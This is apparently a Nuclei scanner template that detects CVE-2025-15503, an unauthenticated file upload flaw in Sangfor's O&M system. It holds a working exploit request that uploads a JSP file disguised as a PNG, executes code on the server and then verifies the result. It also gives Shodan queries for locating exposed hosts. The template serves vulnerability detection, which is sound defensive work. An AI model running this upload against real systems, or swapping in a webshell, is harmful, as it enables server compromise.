id: CVE-2025-15503

info:
  name: Sangfor O&M System Arbitrary File Upload Vulnerability (CVE-2025-15503)
  author: Ark
  severity: critical
  description: |
    Sangfor Operation and Maintenance Management System (versions up to 3.0.8) is vulnerable to unrestricted file upload through the common.jsp endpoint. The File argument lacks proper validation, allowing attackers to upload malicious JSP files that execute arbitrary code on the server.
  impact: |
    Unauthenticated attackers can upload webshells and other malicious files due to improper access controls, leading to complete server compromise and remote code execution.
  remediation: |
    Update Sangfor Operation and Maintenance Management System to version 3.0.9 or later. Implement proper file type validation, authentication checks, and restrict access to the upload functionality.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-15503
    - https://github.com/advisories/GHSA-h49h-jpp7-xv85
    - https://dbugs.ptsecurity.com/vulnerability/PT-2026-1780
    - https://vuldb.com/?id.340348
  metadata:
    verified: true
    max-request: 2
    shodan-query:
      - html:"/fort/login"
      - header:"FORTSESSIONID"
  tags: cve,cve2025,sangfor,rce,upload,intrusive,vuln

flow: http(1) && http(2)

http:
  - raw:
      - |
        POST /fort/trust/version/common/common.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36
        Content-Type: multipart/form-data;boundary=----WebKitFormBoundary

        ------WebKitFormBoundary
        Content-Disposition: form-data; name="file"; filename="arkx.jsp"
        Content-Type: image/png

        <%@page import="java.security.MessageDigest,java.math.BigInteger"%><%MessageDigest md=MessageDigest.getInstance("MD5");md.update("20260127".getBytes());out.print(new BigInteger(1,md.digest()).toString(16));new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
        ------WebKitFormBoundary--

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains(body, 'Upload success')
        condition: and
        internal: true

  - raw:
      - |
        GET /fort/trust/version/common/arkx.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains(body, '812127202f52fb7c507acee68f686323')
        condition: and